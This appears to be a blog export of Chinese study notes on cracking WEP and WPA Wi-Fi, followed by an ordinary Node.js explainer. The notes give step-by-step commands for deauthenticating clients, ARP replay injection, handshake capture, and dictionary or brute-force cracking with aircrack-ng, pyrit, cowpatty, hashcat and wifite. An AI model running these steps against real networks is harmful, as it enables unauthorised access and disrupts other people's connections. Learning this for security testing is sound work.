<h1 id="单纯字典跑包"><a href="#单纯字典跑包" class="headerlink" title="单纯字典跑包"></a>单纯字典跑包</h1><p>pyrit -r [握手包] analyze<br>查看握手包的情况<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/5.jpg" alt="5">  </p>
<p>pyrit -r 抓包的cap -i 字典 -b [BSSID] attack_passthrough<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/6.jpg" alt="6"> </p>
<h1 id="hash-table跑包"><a href="#hash-table跑包" class="headerlink" title="hash-table跑包"></a>hash-table跑包</h1><p>创建hash-table<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/7.jpg" alt="7">  </p>
<p>pyrit -r 抓到的cap -i [刚生成的.hash文件] -b [BSSID] attack_cowpatty<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/8.jpg" alt="8"><br>(cowpatty有个BUG:不认最后一行密码）  </p>
<h1 id="batch-table跑包"><a href="#batch-table跑包" class="headerlink" title="batch-table跑包"></a>batch-table跑包</h1><p>先导入到批处理数据库<br>pyrit-i 字典 import_passwords<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/1.jpg" alt="1"><br>瞬间完成。  </p>
<p>导入essid<br>pyrit -e [essid] create_essid<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/2.jpg" alt="2">  </p>
<p>生成数据库<br>pyrit batch<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/3.jpg" alt="3"><br>生成速度跟aircrack-ng破解差不多  </p>
<p>跑包<br>pyrit -e [essid] -r [抓到的cap] attack_batch<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/4.jpg" alt="4"><br>速度比hash-table快<br>pyrit -e [essid] -r [抓到的cap] attack_db<br>5千万每秒的速度或者更快   </p>
<h2 id="弊端："><a href="#弊端：" class="headerlink" title="弊端："></a>弊端：</h2><p>1.和hash-table一样，需要先费时间生成<br>2.不具备传播性即不能移动复制给他人</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WPA </tag>
            
            <tag> pyrit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-windows下GPU跑包加速]]></title>
        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-windows%E4%B8%8BGPU%E8%B7%91%E5%8C%85%E5%8A%A0%E9%80%9F/</url>
        <content type="html"><![CDATA[<p>本文用到的工具为ewsa,为windows环境下的工具<br>此工具支持GPU加速  </p>
<h2 id="破解流程："><a href="#破解流程：" class="headerlink" title="破解流程："></a>破解流程：</h2><p>1.选项–CPU选项<br>2.选项–GPU选项<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/1.jpg" alt="1"><br>3.选项–攻击选项–新增字典（默认目录下会携带英德俄三文的字典）<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/2.jpg" alt="2"><br>4.文件–导入tcpdump文件–选择已抓到握手包的cap文件–选择ssid<br>5.开始测试–字典枚举攻击<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/3.jpg" alt="3"><br>（作者的跑包速度为每秒3000个）</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WPA </tag>
            
            <tag> ewsa </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-自动化破解WPA加密]]></title>
        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WPA%E5%8A%A0%E5%AF%86/</url>
        <content type="html"><![CDATA[<h2 id="利用的是wifite自动化工具"><a href="#利用的是wifite自动化工具" class="headerlink" title="利用的是wifite自动化工具  "></a>利用的是wifite自动化工具  </h2><p>airmon-ng start wlan0进入monitor mode<br>wifite -dict 字典<br><img src="/2017/02/12/WPA破解-自动化破解WPA加密/1.jpg" alt="1"><br>一定要等到有CLIENT才能更容易的破解<br>如果路由器开了WPS则会先尝试枚举wps的PIN码(新版wifite会先调用pixiwps秒破，失败继续reaver枚举）<br><img src="/2017/02/12/WPA破解-自动化破解WPA加密/2.jpg" alt="2"> </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> wifite </tag>
            
            <tag> WPA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-Hash-table加速并用Cowpatty破解]]></title>
        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-Hash-table%E5%8A%A0%E9%80%9F%E5%B9%B6%E7%94%A8Cowpatty%E7%A0%B4%E8%A7%A3/</url>
        <content type="html"><![CDATA[<p>cowpatty也是一款跑包工具<br>可直接用字典，和aircrack-ng一样：<br>cowpatty -f 字典 -r [捕获的报文] -s [ssid]<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/1.jpg" alt="1">   </p>
<p>####最好的方式用hash-table破解<br>先创建hash-table<br>genpmk -f 字典 -d 生成到哪 -s ssid<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/2.jpg" alt="2"><br>生成hash-table时速度为180个每秒，生成较慢  </p>
<p>但是用hash-table跑包时，速度达4W每秒<br>cowpatty -d [hash-table] -r [捕获的报文] -s [ssid]<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/3.jpg" alt="3">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> cowpatty </tag>
            
            <tag> WPA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-hashcat跑包破解]]></title>
        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-hashcat%E8%B7%91%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
        <content type="html"><![CDATA[<p>hashcat工具和aircrack-ng差不多，但是hashcat能破解多种类型的密文  </p>
<p>aircrack-ng [抓到的cap] -J xxx<br>选择需要破解的AP<br>就生成hccap格式的文件名为xxx.hccap   </p>
<p>运行hashcat发现版本太老<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/1.jpg" alt="1"><br>解决方法：<br>把时间调到2012年就能使用  </p>
<p>hashcat能跑的类型：<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/2.jpg" alt="2"><br>hashcat -m 2500 xxx.hccap /zidian.txt<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/3.jpg" alt="3"><br>速度和aircrack-ng一样，没有加速，都是利用cpu</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WPA </tag>
            
            <tag> hashcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-aircrack-ng破解WPA加密]]></title>
        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-aircrack-ng%E7%A0%B4%E8%A7%A3WPA%E5%8A%A0%E5%AF%86/</url>
        <content type="html"><![CDATA[<p>WPA基本上都是暴力破解，如果开启了WPS,应优先WPS<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/1.jpg" alt="1"><br>网卡进入监听模式并抓包<br>airodump wlan0mon<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/1.jpg" alt="1"><br>确认目标信息<br>airodump wlan0mon -w /root/1<br>这个不指定清楚，比较难抓包，要看无线网卡的功率。<br>推荐这个：airodump-ng -w /root/Desktop/wpa -c 1 wlan0mon –ignore-negative-one<br>一旦指定-w,就开始捕获握手包（在连接设备时产生）<br>所以需要进行重连攻击<br>aireplay-ng -0 5 -a APMAC -c 客户端mac wlan0mon –ignore-negative-one<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/3.jpg" alt="3"><br>客户端收到含有下线的beacon管理帧，就会下线<br>然后重连，进而获得握手包<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/4.jpg" alt="4"><br>接下来就破解<br>aircrack-ng -w /root/desktop/zidian.txt /root/desktop/wpa-01.cap<br>选择有握手包的AP  </p>
<p><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/5.jpg" alt="5"><br>接下来就是时间和人品的问题了  </p>
<h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>不指定字典情况下破解WPA/WPA2<br>crunch 10 10 iSafe12345 | aircrack-ng /root/Desktop/wpa-01.cap -e [ESSID] -w -<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/6.jpg" alt="6"> </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> aircrack-ng </tag>
            
            <tag> WPA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WEP破解-破解WEP新思路--Hirte]]></title>
        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-%E7%A0%B4%E8%A7%A3WEP%E6%96%B0%E6%80%9D%E8%B7%AF-Hirte/</url>
        <content type="html"><![CDATA[<p>转自安全客<br>有一点推荐：<br>修改伪IPMAC为目标Ap的MAC<br>使用macchanger -m 02:BD:11:11:11:11 wlan0(修改前先down掉)<br><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/1.jpg" alt="1">  </p>
<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/2.jpg" alt="2">  </p>
<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/3.jpg" alt="3">  </p>
<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/4.jpg" alt="4"> </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WEP破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Hirte </tag>
            
            <tag> macchanger </tag>
            
            <tag> WEP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WEP破解-wifite自动化破解WEP加密]]></title>
        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-wifite%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
        <content type="html"><![CDATA[<p>wifite工具为kali自带，此工具自动使用各种攻击方式进行抓包<br><img src="/2017/02/12/WEP破解-wifite自动化破解WEP加密/1.jpg" alt="1"><br>选择有client的会比较容易破解，有client的会自动采用ARP重放攻击等方式容易收集ivs<br>ctrl+c然后选择AP num<br><img src="/2017/02/12/WEP破解-wifite自动化破解WEP加密/2.jpg" alt="2"><br>等到特定数目时，会自动使用Crack<br>破解不成功会继续收集ivs直到成功为止。</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WEP破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WEP </tag>
            
            <tag> wifite </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WEP破解-Gerix-wifi-cracker自动化破解WEP加密]]></title>
        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-Gerix-wifi-cracker%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
        <content type="html"><![CDATA[<p>Gerix这个工具原先在BT5有，到kali就没了<br>直接运行python gerix.py<br>出现图形化界面<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/1.jpg" alt="1"><br>在configuration界面选择网卡，单击网卡名称即可（mon0)<br>选择下方的Rescan networks扫描附近网络<br>再单击目标Essid即可<br>此次选择的是wep加密方式的AP<br>切换到WEP选项卡<br>此次就使用通用方式General functionalities<br>选择start sniffing and logging开始抓包<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/1.jpg" alt="1"><br> 在点击 Performs a test injection AP进行攻击<br>使用的是aireplay-ng -9 -a 02:…:ee …<br>等待Data&gt;5000,就可以切换到Cracking选项卡点击Aircrack-ng Decrypt WEP password<br>如果初始化向量增长慢，可以用aRP重放攻击（WEP选项卡里有）<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/3.jpg" alt="3"><br>大概15000ivs即可 </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WEP破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WEP </tag>
            
            <tag> Gerix </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WEP破解-aircrack-ng破解WEP加密]]></title>
        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-aircrack-ng%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
        <content type="html"><![CDATA[<p>wep加密方式已经不常见了，因为wep加密很脆弱，几分钟就可破解。<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/1.jpg" alt="1"><br>家用路由器环境  </p>
<p>在此讲一下Aircrack-ng工具包：<br>aircrack-ng 破解<br>airmon-ng 改变网卡工作模式<br>airodump-ng 捕获报文<br>aireplay-ng 提供各种攻击（例如arp注入攻击），为airodump-ng创造更多报文<br>airserv-ng 网卡连接到指定端口 可用来做无限跳板<br>airolib-ng 彩虹表破解创建数据库文件<br>airdecap-ng 解包  </p>
<p>将网卡启用监听模式后airodump-ng wlan0mon确认路由器情况捕获信息<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/2.jpg" alt="2"><br>然后用airodump wlan0mon -c 1 –ivs(只保存初始化向量） -w /root/桌面/wep –bssid 02:BD:18:08:28:66  只对它一个进行抓包<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/3.jpg" alt="3"><br>如果下面没有客户端时，在实验中可以自己手机主动连接到该AP,在实际操作中只能等待别人客户端连接！<br>接下来需要进行ARP重放攻击（截获ARP报文，将数据修改伪装成ARP报文再发送，获取回应的初始化向量）<br>使用到aireplay-ng<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/4.jpg" alt="4"><br>aireplay-ng -3 -b 02:BD:18:08:28:66 -h 98:FA:E3:5E:DF:F9 wlan0mon<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/5.jpg" alt="5"><br>但是连接后的客户端已经映射好了ARP，不在产生ARP请求了<br>可以使用掉帧重连攻击（使得客户端重新连接AP,即可产生ARP报文）<br>aireplay-ng -0 5 -a 02:BD:18:08:28:66 -c 98:FA:E3:5E:DF:F9 wlan0mon<br>使用deauth攻击方式5次，-a ap,-c 客户端<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/6.jpg" alt="6"><br>等待客户端重新连接<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/7.jpg" alt="7"><br>连接上后发现ARP请求<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/8.jpg" alt="8"><br>Frames快速增长,等到越多越好（作者等到了10W)<br>接下来进行破解，另开终端<br>输入aircrack-ng /root/桌面/WEP-01.ivs<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/9.jpg" alt="9"><br>不到1秒就破解出来了<br>FF：A4:E9:ED:17去掉：就是密码了</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WEP破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WEP </tag>
            
            <tag> aircrack-ng </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[环境初探-熟悉kismet、airdump-ng]]></title>
        <url>https://517736522.github.io/2017/02/12/%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2-%E7%86%9F%E6%82%89kismet,airodump-ng/</url>
        <content type="html"><![CDATA[<h1 id="kismet"><a href="#kismet" class="headerlink" title="kismet"></a>kismet</h1><p>kismet为kali内置工具–扫描附近无线网络<br>现将网卡置为监听模式<br>airmon-ng start wlan0<br>出现wlan0mon网卡<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/1.jpg" alt="1"><br>输入kismet回车<br>一路回车<br>出现这个界面时<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/2.jpg" alt="2"><br>输入网卡名称-add<br>出现主界面<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/3.jpg" alt="3"><br>sort排序<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/4.jpg" alt="4"><br>出现的网卡为可选的，双击可查看详细信息<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/5.jpg" alt="5"><br>type：Beacon（advertising AP)<br>信标帧Beacon分为probe request和probe relay<br>主动探测为发送request 寻找附近AP ,AP 就回复relay  </p>
<h1 id="airodump-ng"><a href="#airodump-ng" class="headerlink" title="airodump-ng"></a>airodump-ng</h1><p>airodump-ng为kali内置工具—抓包（握手包）<br>现将网卡置为监听模式（monitor mode)<br>airmon-ng start wlan0<br>kali1.0可以直接使用airodump-ng wlan0 抓包<br>kali2.0直接使用airodump-ng wlan0mon会出现问题<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/6.jpg" alt="6"><br>需要先把wlan0mon down掉<br>ifconfig wlan0mon down再抓包就行了<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/7.jpg" alt="7">  </p>
<p>airodump有几个选项<br>-w 输出文件<br>–ivs 只保存ivs<br>-c 信道<br>–bssid mac<br>–essid 名称<br>airodump-ng -w /root/桌面/1  -c 1 wlan0mon  </p>
<p>BSSID ap的mac<br>PWR 信号强度<br>Beacons 无线ap发的通告，周期发送（定期发送信标帧，“我在着呢！”）<br>#Data 抓到的数据包<br>ch 信道<br>MB 数字表示最大传输速率（网络标准),e表示802.11e,”.”表示短前导码。<br>注意：前导码是数据包的一组比特组，用来让接受者同步并准备接受实际的数据。<br>ENC 加密方式<br>CIPHER 加密算法，WPA-TKIP WPA2-CCMP<br>AUTH 认证 MGT PSK OPN开放 pre-shared key(域共享秘钥）<br>ESSID 通俗指wifi名字 <length:8>这样表示未广播<br>Station 客户端<br>RATE 传输速率比如300M无线路由器<br>Lost 最近的10秒内丢包数seq tcp<br>Frames 来自客户端的数据frame<br>Probe 主动探测  </length:8></p>
<h2 id="特殊讲解："><a href="#特殊讲解：" class="headerlink" title="特殊讲解："></a>特殊讲解：</h2><p><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/8.jpg" alt="8"><br>not associated 表示未关联，是因为客户端发出信标帧，未与AP连接<br>有时候channel会显示-1 应不予理会也可加选项–ignore-negative-one<br>抓到握手包会在界面右上角显示hand-shark字样  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 环境初探 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> kismet </tag>
            
            <tag> airodump-ng </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[无线渗透课前知识]]></title>
        <url>https://517736522.github.io/2017/02/11/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E8%AF%BE%E5%89%8D%E7%9F%A5%E8%AF%86/</url>
        <content type="html"><![CDATA[<h1 id="Aircrack-ng工具包"><a href="#Aircrack-ng工具包" class="headerlink" title="Aircrack-ng工具包"></a>Aircrack-ng工具包</h1><p><img src="/2017/02/11/无线渗透课前知识/1.jpg" alt="1"> </p>
<h2 id="802-11a-b-c-g-n-ac标准：（802协议全都在二层）"><a href="#802-11a-b-c-g-n-ac标准：（802协议全都在二层）" class="headerlink" title="802.11a/b/c/g/n/ac标准：（802协议全都在二层）   "></a>802.11a/b/c/g/n/ac标准：（802协议全都在二层）   </h2><p>IEEE提出，是工作在数据链路层（二层）的无线协议  </p>
<h2 id="wifi标准："><a href="#wifi标准：" class="headerlink" title="wifi标准："></a>wifi标准：</h2><p>是有wifi联盟提出的一个802.11标准的一个子集。wifi联盟保证了各种不同的无线产品能一起工作。    </p>
<h2 id="无线接入点Access-Point："><a href="#无线接入点Access-Point：" class="headerlink" title="无线接入点Access Point："></a>无线接入点Access Point：</h2><p>胖AP:类似于家用无线路由器，具有三层路由功能<br>瘦AP:仅仅类似于以太网集线器，用于转换电信号和无线信号  </p>
<h2 id="客户端STA"><a href="#客户端STA" class="headerlink" title="客户端STA:  "></a>客户端STA:  </h2><p>连接上AP的主机为客户端  </p>
<h2 id="无线局域网ap术语介绍："><a href="#无线局域网ap术语介绍：" class="headerlink" title="无线局域网ap术语介绍："></a>无线局域网ap术语介绍：</h2><p>SSID服务集标识： WIFI名称<br>BSSID：AP的2层地址，mac地址（高级AP会有多个BSSID)<br>ESSID:扩展服务集标识，通常是跟SSID对等，实际不同<br>工作模式：802.11b/g/n(2.4G) /a/n/ac(5G) （/n模式和速率向下兼容）   </p>
<h2 id="信道channel："><a href="#信道channel：" class="headerlink" title="信道channel："></a>信道channel：</h2><p>发送方和接收方期望载波的频率是固定的，并在特殊性定的范围内变化，这种范围称为信道，WLAN信道是由当前使用的802.11标准决定的。  </p>
<p><img src="/2017/02/11/无线渗透课前知识/2.jpg" alt="2"> </p>
<p><img src="/2017/02/11/无线渗透课前知识/3.jpg" alt="3"></p>
<p>信道是由法律规定的<br>1,6,11信道互不重叠，互不干扰  </p>
<p>RSSI是信号强度记录器，一般是一个负值，越接近0越好<br>dBm值从一个信号等级系数获取，它由厂商决定<br>SNR（信噪比）是信号强度相对于噪音的级别，越高越好</p>
<h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p>1.虚拟机kali linux<br>2.USB无线网卡 RT3070 RTL8187<br>3.打开服务VMware USB Arbitration Service  </p>
<h2 id="无线网卡的工作模式："><a href="#无线网卡的工作模式：" class="headerlink" title="无线网卡的工作模式："></a>无线网卡的工作模式：</h2><p>1.Managed Mode（平时连接WIFI）<br>2.Ad Hoc（10年前的东西，对等网络，组成局域网）<br>3.Master Mode(猎豹免费WIFI,soft-AP)<br>4.Monitor Mode(监听模式， （混杂模式为有线监听））<br>5.WDS  </p>
<h2 id="kali命令："><a href="#kali命令：" class="headerlink" title="kali命令："></a>kali命令：</h2><p>service /etc/init.d/networking restart 重启网卡<br>vim /etc/resolv.conf 修改DNS<br>内容为nameserver 8.8.8.8  </p>
<h2 id="关于破解wpa："><a href="#关于破解wpa：" class="headerlink" title="关于破解wpa："></a>关于破解wpa：</h2><p>先用有关社会工程学软件生成字典尝试破解，不行再用大字典<br>Crunch生成字典工具<br>crunch 最短长度 最长长度 字符集 选项<br>crunch 8 12 -f /usr/share/crunch/charset.1st(字符集）ualpha -o /root/pass.txt  </p>
<h2 id="WirelessMon-professional："><a href="#WirelessMon-professional：" class="headerlink" title="WirelessMon professional："></a>WirelessMon professional：</h2><p>实现WINDOWS下对附近无线网络进行扫描<br><img src="/2017/02/11/无线渗透课前知识/4.jpg" alt="4"><br><img src="/2017/02/11/无线渗透课前知识/5.jpg" alt="5"></p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[关于NodeJS的单线程和异步IO]]></title>
        <url>https://517736522.github.io/2017/01/21/%E5%85%B3%E4%BA%8ENodeJS%E7%9A%84%E5%8D%95%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%BC%82%E6%AD%A5IO/</url>
        <content type="html"><![CDATA[<h5 id="引用文-摘自-IBM-刘欣-个人公众号：码农翻身"><a href="#引用文-摘自-IBM-刘欣-个人公众号：码农翻身" class="headerlink" title="引用文  摘自 IBM 刘欣 个人公众号：码农翻身"></a>引用文  摘自 IBM 刘欣 个人公众号：码农翻身</h5><p>美丽的七侠镇上有一条美食街，很多著名的饭店都开在这里，有老字号的Apache, PHP, 最近几年火热的Ruby on Rail , 还有那些重量级的餐饮集团Websphere, Weblogic 等。</p>
<p>这些饭店老板根据自己的实力，或多或少的雇佣了一些店小二来招待来客，这些小二干活都非常殷勤，没有一个偷懒耍滑，把顾客招待的舒舒服服， 所以平日里饭馆运转的还不错，相安无事。</p>
<p>但是随着《武林外传》的拍摄和播放， 七侠镇旅游业大爆发，游客像潮水一样蜂拥而至， 现有的店小二招待不过来了， 到了饭点，每家的门前都排起了长队，游客们吃不上饭，个个怨声载道。</p>
<p>看到这种情况，有些老板咬了咬牙，在人工费不断上涨的情况下， 多雇了一些小二来帮忙， 无奈总是赶不上顾客增长的速度。</p>
<p>某一天有个美国老外来到七侠镇上旅游， 也看到了吃不上饭的问题，他仔细分析了一番后发现了一个秘密： 原来这些店都采用了同一套叫做“全程贴心服务”的模式， 这个模式很有意思：</p>
<p>客人来了以后，马上有个店小二殷勤迎上去，带着找座位，点菜，给后厨下单<br>由于后厨做菜需要很长时间，店小二就在客人的旁边等着。</p>
<p>后厨一摇铃铛，大喊一声：上菜，店小二马上端到客人面前， 然后站在一边等着客人吃完</p>
<p>客人说：结账，小二收钱，找钱，送客， 迎接下一位。</p>
<p>通常这个时候门口都排成了好几百人了！</p>
<p>这个VIP服务实在是太贴心了！ 导致的结果很明显，饭店有几个店小二，就只能同时接待几个顾客。<br>(当然，现实中是没有饭店是这么做的，否则就等着关门吧)</p>
<p>老外一声不吭的回去了。<br>过了几个月， 美食一条街上出现了一个巨火无比的饭馆： Node.js<br>虽然这个饭店中人满为患， 可门口竟然没有排队的！<br>更让人吃惊的是，这个店里声称： 我只需要一个店小二！</p>
<p>Node.js这个美国老外开的饭店确实只用了一个店小二， 只不过这个小二干活的方式与众不同，他把所有的工作分为两类：<br>(1) 马上就能干完的，例如迎客，点菜，找座，下单 等等<br>(2) 需要等待别人干完才能干的活，例如上菜，结账等<br>对(1) 这个小二马上干活<br>对(2) 店小二不会等待，他只是告诉别人说，你弄完了告诉我一声，我会接着干， 然后马上去做第一类工作</p>
<p>客人来了以后，这个店小二殷勤迎上去，带着找座位，点菜，给后厨下单<br>由于后厨做菜需要很长时间，店小二闪电般的离开，去干别的活了，可能是迎客，点菜，找座等，总之是那些不用等待，迅速干完的活。<br>后厨大喊一声：上菜，这个小二马上端到客人面前，然后离开，干其他活。<br>客人说：结账，小二收钱，找钱，然后还是迅速闪人，干其他活。</p>
<p>这个唯一的店小二的能力被发挥到了极致，一刻不停，闪电般的在饭店里跑来跑去，因为老板明确的告诉他： 不要等！</p>
<p>Node.js饭店的基础设施很强大，一旦那些耗时的操作完成，店小二立刻就能知道，飞奔过来马上接着干，如果遇到新的耗时的操作，小二毫不留情的离开。<br>就这么简单， Node.js饭店火了，它同时接待客人的数量大大增加，而服务质量保持基本不变。</p>
<p>这是我杜撰出来的一个不成熟的故事，帮助我来理解Node.js的特点：只用一个线程来处理所有请求，事件驱动编程</p>
<p>如果我们回过头来再以计算机的视角看一下会更加清楚：<br>店小二： 线程<br>顾客：http请求<br>第一类工作(迎客，找座，下单) : 在服务器端的代码，能够快速执行<br>后厨做菜，客人吃饭： 耗时的I/O 操作<br>后厨大喊一声：上菜 ： 这是一个长时间I/O 操作完成的后所发出的事件<br>客人说：结账： 另外一个长时间I/O 操作完成的后所发出的事件<br>第二类工作(上菜，结账) : 同样是能快速执行的代码，但是他们需要等待那些耗时的I/O 操作完成才能开始，确切的来说，收到了系统发出的事件以后才开始执行。在Node.js中实际上是在回调函数中来执行的</p>
<pre><code>下面是Node.js服务模式的伪代码：  
1. 迎客();  
2.   
3. 找座();  
4. 
5. 下单();  
6. 
7. 后厨处理(&quot;做菜完成事件&quot;， function(){  
8. 
9.    上菜处理()；  
10. 
11. 客人吃饭(&quot;吃饭完成事件&quot;，function(){  
12. 
13.     结账处理();  
14. 
15.    送客();  
16. 
17. });  
18. 
19. });  
20. 
</code></pre><p>需要引起注意的是：</p>
<ol>
<li><p>后厨处理（）这个函数接受两个参数，一个是事件名，另外一个是匿名的回调函数，事件发生，回调函数才会执行。<br>客人吃饭（）函数也是类似。<br>Node.js 使用的JavaScript作为服务器端的编程语言，这种回调的方式对于javascript程序员来说，是非常自然的事情，同时从代码的角度来讲，也显得非常清晰。<br>另外Node.js使用Chrome的V8引擎来执行javascript,效率非常高</p>
<p> 我们能不能把代码写成这样？  </p>
<ol>
<li>迎客();  </li>
<li></li>
<li>找座();  </li>
<li></li>
<li>下单();  </li>
<li></li>
<li>后厨处理(“做菜完成事件”， function(){  </li>
<li></li>
<li>上菜处理()；      </li>
<li></li>
<li>});  </li>
<li></li>
<li>客人吃饭(“吃饭完成事件”，function(){  </li>
<li></li>
<li>结账处理();  </li>
<li></li>
<li>});  </li>
<li></li>
<li>送客();   </li>
<li></li>
</ol>
</li>
</ol>
